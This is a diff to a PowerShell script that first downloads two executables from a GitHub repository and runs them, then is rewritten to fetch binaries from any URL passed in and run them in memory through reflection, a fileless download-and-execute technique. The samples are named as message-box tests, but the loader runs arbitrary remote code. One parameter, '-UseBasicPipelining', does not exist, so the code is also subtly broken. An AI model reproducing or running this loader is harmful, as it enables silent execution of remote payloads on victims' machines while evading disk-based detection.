@@ -1,15 +1,32 @@
-# URLs of the executable files
-$U1 = 'https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.exe'
-$U2 = 'https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.exe'
+param(
+    [string]$url1,
+    [string]$url2
+)
 
-# Create temporary files to store the downloaded EXEs
-$TempFile1 = [System.IO.Path]::GetTempFileName()
-$TempFile2 = [System.IO.Path]::GetTempFileName()
+# Function to run an EXE from memory
+function Run-ExeFromMemory {
+    param([string]$url)
 
-# Download the EXEs from GitHub into temporary files
-Invoke-WebRequest -Uri $U1 -OutFile $TempFile1
-Invoke-WebRequest -Uri $U2 -OutFile $TempFile2
+    # Download the EXE as a byte array (since it's a text file that should be renamed to EXE)
+    $exeBytes = Invoke-WebRequest -Uri $url -UseBasicPipelining | Select-Object -ExpandProperty Content
 
-# Run the downloaded EXEs
-Start-Process -FilePath $TempFile1 -Wait
-Start-Process -FilePath $TempFile2 -Wait
+    # Load the byte array into a memory stream
+    $memoryStream = New-Object System.IO.MemoryStream
+    $memoryStream.Write($exeBytes, 0, $exeBytes.Length)
+    $memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin)  # Reset position to beginning of stream
+
+    # Load the EXE into memory using Reflection
+    $assembly = [System.Reflection.Assembly]::Load($memoryStream.ToArray())
+
+    # Create and run the EXE (it assumes the EXE has a valid entry point)
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint) {
+        $entryPoint.Invoke($null, @())
+    } else {
+        Write-Host 'No entry point found in EXE'
+    }
+}
+
+# Run the EXEs in memory by calling the function with URLs
+Run-ExeFromMemory -url $url1
+Run-ExeFromMemory -url $url2
